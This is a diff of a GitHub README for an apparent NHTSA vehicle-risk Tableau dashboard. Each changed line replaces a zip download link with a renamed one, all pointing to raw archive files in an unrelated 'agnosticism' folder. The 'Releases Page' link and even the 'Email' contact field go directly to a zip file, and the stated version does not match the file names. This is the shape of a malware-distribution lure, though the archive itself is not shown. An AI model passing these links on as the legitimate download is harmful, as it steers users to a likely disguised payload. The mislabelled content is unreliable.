@@ -1,7 +1,7 @@
 # 🚗 nhtsa-consumer-vehicle-risk-dashboard - Analyze Vehicle Safety Easily
 
 ## 📦 Download the Latest Release
-[![Download Latest Release](https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/dashboard_nhtsa_vehicle_risk_consumer_v3.6.zip%20Latest%https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/dashboard_nhtsa_vehicle_risk_consumer_v3.6.zip)](https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/dashboard_nhtsa_vehicle_risk_consumer_v3.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/consumer_risk_dashboard_nhtsa_vehicle_3.7.zip%20Latest%https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/consumer_risk_dashboard_nhtsa_vehicle_3.7.zip)](https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/consumer_risk_dashboard_nhtsa_vehicle_3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the **NHTSA Consumer Vehicle Risk Dashboard**! This interactive Tableau dashboard helps you analyze vehicle complaint data from the National Highway Traffic Safety Administration (NHTSA). With this tool, you can quickly identify high-risk vehicle models and components using clear, severity-based risk metrics.
@@ -17,7 +17,7 @@ Before you start, make sure your system meets the following requirements:
 To get the application, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page where you can find the latest version of the dashboard.
-   [Visit the Releases Page](https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/dashboard_nhtsa_vehicle_risk_consumer_v3.6.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/consumer_risk_dashboard_nhtsa_vehicle_3.7.zip)
 
 2. **Choose the Release:** You will see a list of available releases. Select the most recent one, which is v1.0 at the time of writing.
 
@@ -48,7 +48,7 @@ For more information or help with the dashboard, consider the following resource
 
 ### 📧 Contact Information
 If you encounter issues or have feedback, feel free to reach out:
-- **Email:** https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/dashboard_nhtsa_vehicle_risk_consumer_v3.6.zip
+- **Email:** https://raw.githubusercontent.com/karim969/nhtsa-consumer-vehicle-risk-dashboard/main/agnosticism/consumer_risk_dashboard_nhtsa_vehicle_3.7.zip
 - **GitHub Issues:** Report any problems through the Issues section of the repository.
 
 ### ⚙️ Frequently Asked Questions
